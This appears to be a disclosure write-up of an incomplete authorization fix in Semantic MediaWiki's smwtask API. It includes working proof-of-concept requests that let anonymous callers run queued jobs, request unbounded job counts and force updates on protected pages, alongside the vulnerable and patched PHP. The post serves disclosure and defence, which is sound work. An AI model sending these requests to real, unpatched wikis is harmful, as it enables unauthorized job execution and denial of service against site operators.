---
title: "SemanticMediaWiki's smwtask Authorization Fix Left Anonymous Callers Running Queued Jobs"
date: 2026-09-28
target: "SemanticMediaWiki/SemanticMediaWiki"
severity: High
identifier: "GHSA-rjqv-6r83-pg8v"
advisory_url: "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-rjqv-6r83-pg8v"
summary: "SemanticMediaWiki 7.3.0 fixed a missing-authorization bug in the smwtask API module (GHSA-jr78-w6w5-m8f8) by making every task declare the right it needs — but it assigned three administrator-only tasks the edit right, which anonymous users hold on a stock MediaWiki. An unauthenticated caller could still run arbitrary queued jobs and force store updates on protected pages."
---

## Summary

Semantic MediaWiki's `api.php?action=smwtask` endpoint backs the maintenance operations behind `Special:SMWAdmin`. A first advisory, [GHSA-jr78-w6w5-m8f8](https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-jr78-w6w5-m8f8) (High, 7.3), reported that the module performed no authorization check at all, so any unauthenticated visitor could reach those operations. Release 7.3.0 fixed it by making every task declare the MediaWiki right it requires, checked before the task runs, with a fail-closed `smw-admin` default.

The fix closed the four administrator tasks, but it assigned the `edit` right to three of the operations the advisory itself described as administrator-only: `update`, `check-query`, and `run-joblist`. On a stock MediaWiki, `edit` is a right that *anonymous* users hold. Nothing else in the module excludes an anonymous caller. So the reported class was only half-closed: a completely unauthenticated caller could still run arbitrary queued jobs and force semantic-store updates on pages protected to `sysop`. This is [GHSA-rjqv-6r83-pg8v](https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-rjqv-6r83-pg8v), fixed in 7.3.1.

## Background

The 7.3.0 fix (commit `7c65baf61`) added an authorization gate to `src/MediaWiki/Api/Task.php`: each task now declares the right it needs via `Task::getRequiredPermission()`, defaulting to `smw-admin`, and the module calls `checkUserRightsAny()` with that right before running. The base class defaults fail-closed to `smw-admin`, and exactly four tasks override it:

| Task | Declared right |
| --- | --- |
| `update` | `edit` |
| `check-query` | `edit` |
| `run-joblist` | `edit` |
| `run-entity-examiner` | `read` |

The in-code justification for the `edit` tasks is that they are *"triggered by post-edit processing for the user who just saved the page."* That describes the legitimate caller — the post-edit JavaScript calls `run-joblist` with the job map the server rendered for the page just saved — but the API does not restrict itself to that caller or that map. It accepts whatever a client sends.

## Why `edit` is not a gate for anonymous callers

On a default MediaWiki install, an anonymous request already carries everything the `edit`-level tasks check. Verified live against a stock MediaWiki 1.43.9 with no extra configuration:

```
GET /api.php?action=query&meta=userinfo&uiprop=rights      (no cookies)
-> rights: ["createaccount","read","edit","createpage","createtalk", ...]

GET /api.php?action=query&meta=tokens&type=csrf            (no cookies)
-> csrftoken: "+\"                       # the fixed, public anonymous token

POST /api.php action=edit&title=Main_Page&token=+\         (no cookies)
-> {"edit":{"result":"Success", ...}}     # anonymous editing is on by default
```

The one right that sounds like it should gate write APIs — `writeapi` — is not the anonymous list, but it is also irrelevant: MediaWiki deprecated `writeapi` in 1.32 and core no longer enforces it anywhere. `mustBePosted()`, `needsToken('csrf')`, and `isWriteMode()` do not gate on group membership either. So the three `edit`-level tasks are reachable by a caller with no account and no cookies, using the fixed public token `+\`.

## The vulnerability

`run-joblist` pops and runs jobs from a map the caller supplies, and never validates that map against anything:

```php
// src/MediaWiki/Api/Tasks/JobListTask.php
$subject = WikiPage::doUnserialize( $parameters['subject'] );
$title = $subject->getTitle();
if ( $title === null ) { return [ 'done' => false ]; }   // subject is only a null-guard
$jobList = [];
if ( isset( $parameters['jobs'] ) ) { $jobList = $parameters['jobs']; }   // fully caller-controlled
$log = $this->jobQueue->runFromQueue( $jobList );
return [ 'done' => true, 'log' => $log ];
```

`runFromQueue()` then pops and runs whatever job types the caller named, in whatever count the caller asked for:

```php
foreach ( $list as $type => $amount ) {
    while ( $amount > 0 ) {
        $j = $this->jobQueueGroup->get( $type )->pop();   // any registered job class
        $j->run();
        $log[$type][] = $j->getTitle()->getPrefixedDBKey();
        $amount--;
    }
}
```

The `subject` parameter is used only as a null-guard; it is never cross-checked against the jobs the caller wants popped. `$amount` is unbounded, and the type string is not validated against a set. The response returns the page titles of the jobs it ran, which is a read primitive over the job queue.

`update` has the same shape. `UpdateTask::process()` deserialises the caller's `subject`, builds a store-update job for that title, and runs it — checking the global `edit` right, never the target page. So it re-runs the store update path for any title the caller names, including a `sysop`-protected page the caller cannot edit or even read.

## Proof of concept

The lab is MediaWiki 1.43.9 plus Semantic MediaWiki 7.3.0 (the patched release), SQLite, no job-runner cron so queued jobs stay pending until something runs them. Every request below was sent with no cookies and the public anonymous token `+\`.

The four administrator tasks are correctly denied — the fix does work for them:

```
POST /api.php action=smwtask&task=insert-job&params={...}&token=+\      (no cookies)
-> {"error":{"code":"permissiondenied","info":"You don't have permission to access
    Semantic MediaWiki administration tasks."}}
```

But the same anonymous caller runs a job that only an administrator could enqueue:

```
# 1. administrator enqueues one job through the admin-only insert-job task
POST /api.php action=smwtask&task=insert-job
     &params={"subject":"Main Page#0##","job":"smw.parserCachePurgeJob"}    (Admin session)
-> {"task":{"done":""}}
#    pending smw.parserCachePurgeJob rows in the job queue: 0 -> 1

# 2. anonymous caller, no cookies, public token, runs it
POST /api.php action=smwtask&task=run-joblist
     &params={"subject":"Main Page#0##","jobs":{"smw.parserCachePurgeJob":1}}&token=+\
-> {"task":{"done":"","log":{"smw.parserCachePurgeJob":["Main_Page"]}}}
#    pending smw.parserCachePurgeJob rows in the job queue: 1 -> 0
```

Arbitrary and even non-existent job types are accepted, in an unbounded count:

```
POST .../task=run-joblist&params={"subject":"Main Page#0##",
     "jobs":{"mediawiki.refreshLinks":100000}}&token=+\
-> {"task":{"done":"","log":{"mediawiki.refreshLinks":[]}}}         # no type validation
```

And `update` bypasses page-level protection:

```
# PoCProtected is protected: edit=sysop
POST /api.php action=edit&title=PoCProtected&text=x&token=+\        (no cookies)
-> {"error":{"code":"protectedpage", ...}}

POST /api.php action=smwtask&task=update&params={"subject":"PoCProtected#0##"}&token=+\
-> {"task":{"done":"","log":[]}}                                    # accepted and executed
```

## Impact

An unauthenticated attacker can drive the wiki to execute queued jobs on demand — including maintenance job types the administrator UI only *enqueues* behind `smw-admin` — synchronously inside the request and in arbitrary counts, which exhausts the application and database workers on a populated wiki. They can force full store updates for arbitrary titles, including pages they cannot edit or read, and they can read back the page titles attached to the jobs they ran. What makes this an incomplete fix rather than a regression is that the administrator half of the same capability is correctly denied: an anonymous caller cannot *enqueue* a maintenance job, but can still *run* any queued one.

The confidentiality and integrity impact stay low — titles, and store writes that only re-derive data from existing page content — so the vector mirrors the vendor's own rating for this endpoint: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` = 7.3 High.

## Fix

7.3.1 stops gating these tasks on a wiki-wide right and authorizes the caller against the specific page instead. Both `update` and `run-joblist` now implement `getAuthorizationSubject()`, returning the caller's `subject` so the module checks page-level permission for that exact title rather than a global right an anonymous caller happens to hold:

```php
// UpdateTask / JobListTask, 7.3.1
public function getAuthorizationSubject( array $parameters ): ?string {
    return $parameters['subject'] ?? '';
}
```

`run-joblist` additionally constrains *which* jobs may run. A new `requestedWorkIsPermitted()` check rejects any job type outside the set the post-edit process itself emits, so a caller can no longer pop arbitrary queued jobs of its own choosing:

```php
// JobListTask, 7.3.1
public function requestedWorkIsPermitted( array $parameters ): bool {
    $requested = $parameters['jobs'] ?? [];
    if ( !is_array( $requested ) ) { return true; }
    return array_diff_key( $requested, $this->allowedJobs ) === [];
}
```

That is a page-level authorization check plus an allowlist on the caller-supplied job map — closing both the protected-page bypass and the arbitrary-job-execution primitive. The legitimate post-edit flow, where the caller just saved the page it names, keeps working.

## Timeline

- **2026-09-22** — Reported through GitHub private vulnerability reporting on `SemanticMediaWiki/SemanticMediaWiki`, as an incomplete-fix follow-up to GHSA-jr78-w6w5-m8f8, with an end-to-end PoC against the patched 7.3.0 release.
- **2026-09-28** — Fixed in **7.3.1** and advisory **GHSA-rjqv-6r83-pg8v** published (High, 7.3, CWE-862), crediting the report.

## Disclosure

The advisory is public at [GHSA-rjqv-6r83-pg8v](https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-rjqv-6r83-pg8v). It is worth stressing what the original fix got right: making each task declare its required right, fail-closed to `smw-admin`, was the correct structure — the gap was purely in the right chosen for three tasks. `edit` reads like a sensible "must be a logged-in editor" gate, but on a default MediaWiki it is not a gate at all. When a fix maps a privileged operation onto a coarse platform right, the right's real membership on a stock install — not its name — is what decides whether the fix holds.
